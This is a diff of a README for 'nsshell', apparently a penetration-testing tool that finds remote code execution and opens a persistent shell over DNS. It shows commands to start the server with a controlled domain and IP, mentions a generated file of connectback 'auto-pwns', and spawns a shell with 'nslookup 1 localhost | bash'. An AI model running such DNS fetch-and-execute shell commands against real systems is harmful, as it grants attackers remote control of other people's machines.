@@ -10,16 +10,21 @@ Think sqlmap meets xsshunter - but looking for (blind/nonblind) RCE to get a DNS
 
 Start:
 The tool needs to know which domain it has control over:
-sudo ./nsshell.py hack.com 123.123.123.112
-...
-wrote connectback payloads to:payloads.txt
+
+sudo ./nsshell.py host.com 123.123.123.112
+
+**wrote connectback payloads to:payloads.txt**
 
 The file above contains a list of auto-pwns. Run one of the payloads and a persistent shell will be loaded over DNS.
 
-That's all folks!
+### install
+sudo make install
 
-## install
-sudo make install && echo $(which nsshell) && nsshell localhost 127.0.0.1
+### Run Server - localhost for testing
+sudo python nsshell.py localhost 127.0.0.1
 
-spawn a connectback:
+###Spawn Connectback shell- localhost for testing
 nslookup 1 localhost | bash
+
+
+That's all folks!
